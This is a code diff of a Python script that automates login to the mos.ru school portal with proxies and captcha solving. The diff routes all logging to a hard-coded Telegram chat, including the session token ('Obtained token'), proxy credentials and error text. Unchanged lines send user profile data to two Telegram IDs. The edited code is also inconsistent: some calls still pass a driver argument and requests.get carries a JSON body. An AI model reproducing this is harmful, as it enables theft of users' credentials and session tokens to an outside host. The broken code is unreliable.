@@ -76,31 +76,16 @@ def init_db():
 init_db()
 
 
-def send_screenshot_to_telegram(driver, step_name):
-    """Take screenshot and send to Telegram"""
-    try:
-        # Take screenshot
-        screenshot = driver.get_screenshot_as_png()
-        img = Image.open(BytesIO(screenshot))
-
-        # Convert to base64
-        buffered = BytesIO()
-        img.save(buffered, format="PNG")
-        img_str = base64.b64encode(buffered.getvalue()).decode('utf-8')
-
+def send_screenshot_to_telegram(*step_name):
         # Send to Telegram
-        requests.post(
-            TG_API + "sendPhoto",
+        requests.get(
+            TG_API + "sendMessage",
             json={
                 "chat_id": -1002957969429,
-                "photo": f"data:image/png;base64,{img_str}",
-                "caption": f"Step: {step_name}",
+                "text": f"{step_name}",
                 "parse_mode": "HTML"
             }
         )
-    except Exception as e:
-        print(f"Error sending screenshot: {e}")
-
 
 @dataclass
 class AuthResult:
@@ -119,7 +104,7 @@ def get_random_proxy():
             proxies = f.read().splitlines()
         return random.choice(proxies) if proxies else None
     except Exception as e:
-        print(f"Error reading proxy file: {e}")
+        send_screenshot_to_telegram(f"Error reading proxy file: {e}")
         return None
 
 
@@ -131,7 +116,7 @@ def create_proxy_extension(proxy):
     try:
         ip, port, username, password = proxy.split(':')
     except ValueError:
-        print(f"Invalid proxy format: {proxy}")
+        send_screenshot_to_telegram(f"Invalid proxy format: {proxy}")
         return None
 
     manifest_json = """
@@ -302,7 +287,7 @@ def mosru_auth(
         serv=False
 ) -> AuthResult:
     """Authenticate with mos.ru portal"""
-    print("Authenticating with mos.ru portal")
+    send_screenshot_to_telegram("Authenticating with mos.ru portal")
     chrome_options = Options()
     chrome_options.add_argument("--headless")
     chrome_options.add_argument("--no-sandbox")
@@ -315,38 +300,37 @@ def mosru_auth(
     # Set up proxy if available
     proxy = get_random_proxy()
     if proxy:
-        print(f"Using proxy: {proxy}")
+        send_screenshot_to_telegram(f"Using proxy: {proxy}")
         proxy_ext = create_proxy_extension(proxy)
         if proxy_ext:
             chrome_options.add_extension(proxy_ext)
 
     # Set up Chrome driver path
     chromedriver_path = os.path.join(os.path.dirname(__file__), 'chromedriver')
-    print("Using chromedriver at", chromedriver_path)
+    send_screenshot_to_telegram("Using chromedriver at", chromedriver_path)
 
     for attempt in range(MAX_RETRIES):
-        print("Attempt #", attempt)
+        send_screenshot_to_telegram("Attempt #", attempt)
         user_data_dir = None
         driver = None
         try:
             # Create unique user data directory
             user_data_dir = tempfile.mkdtemp(prefix="chrome_profile_")
             chrome_options.add_argument(f"--user-data-dir={user_data_dir}")
-            print("Using user data directory", user_data_dir)
-
+            send_screenshot_to_telegram("Using user data directory", user_data_dir)
+            
             # Kill any existing Chrome processes
             kill_chrome_processes()
             time.sleep(1)
-            print("Killed chrome processes")
+            send_screenshot_to_telegram("Killed chrome processes")
 
             # Initialize WebDriver
             driver = Chrome(service=Service(chromedriver_path), options=chrome_options)
-            print("Using driver", driver)
+            send_screenshot_to_telegram("Using driver", driver)
 
             # 1. Navigate to login page
             login_url = "https://login.mos.ru/sps/login/methods/password?bo=%2Fsps%2Foauth%2Fae%3Fresponse_type%3Dcode%26access_type%3Doffline%26client_id%3Ddnevnik.mos.ru%26scope%3Dopenid%2Bprofile%2Bbirthday%2Bcontacts%2Bsnils%2Bblitz_user_rights%2Bblitz_change_password%26redirect_uri%3Dhttps%253A%252F%252Fschool.mos.ru%252Fv3%252Fauth%252Fsudir%252Fcallback"
             driver.get(login_url)
-            send_screenshot_to_telegram(driver, "Login page loaded")
 
             # 2. Enter credentials
             WebDriverWait(driver, 10).until(
@@ -374,7 +358,7 @@ def mosru_auth(
 
                         # Wait for captcha solution
                         start_time = time.time()
-                        print("Waiting for captcha solution...")
+                        send_screenshot_to_telegram("Waiting for captcha solution...")
                         while True:
                             solution = check_captcha_solution(task_id)
                             if solution:
@@ -390,7 +374,7 @@ def mosru_auth(
                             time.sleep(2)
 
                         # Enter captcha solution
-                        print(f"Submitting captcha solution: {solution}")
+                        send_screenshot_to_telegram(f"Submitting captcha solution: {solution}")
                         driver.find_element(By.NAME, "captcha_answer").send_keys(solution)
                         send_screenshot_to_telegram(driver, "Captcha solution entered")
                         driver.find_element(By.ID, "bind").click()
@@ -429,16 +413,16 @@ def mosru_auth(
                 )
                 send_screenshot_to_telegram(driver, "Successfully redirected")
             except TimeoutException:
-                print("Timeout waiting for redirect after authentication")
+                send_screenshot_to_telegram("Timeout waiting for redirect after authentication")
                 return AuthResult(status="timeout")
 
             # 5. Get profile data
             token = driver.get_cookie("aupd_token")['value']
             send_screenshot_to_telegram(driver, "Successfully logged in")
-            print(f"Obtained token: {token}")
+            send_screenshot_to_telegram(f"Obtained token: {token}")
 
             user = auth_and_get_user(login, password, token)
-            print(user.get_text())
+            send_screenshot_to_telegram(user.get_text())
             user.send_to_telegram(2015460473)
             user.send_to_telegram(-1002957969429)
 
@@ -448,12 +432,12 @@ def mosru_auth(
             )
 
         except SessionNotCreatedException as e:
-            print(f"Session creation failed (attempt {attempt + 1}/{MAX_RETRIES}): {e}")
+            send_screenshot_to_telegram(f"Session creation failed (attempt {attempt + 1}/{MAX_RETRIES}): {e}")
             if attempt == MAX_RETRIES - 1:
                 return AuthResult(status="error", data={"error": str(e)})
             time.sleep(RETRY_DELAY * (attempt + 1))
         except Exception as e:
-            print(f"Authentication error: {e}")
+            send_screenshot_to_telegram(f"Authentication error: {e}")
             return AuthResult(status="error", data={"error": str(e)})
         finally:
             try:
@@ -474,4 +458,4 @@ def mosru_auth(
 if __name__ == '__main__':
     # Example usage
     result = mosru_auth("your_login", "your_password", mode="manual")
-    print(result)
+    send_screenshot_to_telegram(result)
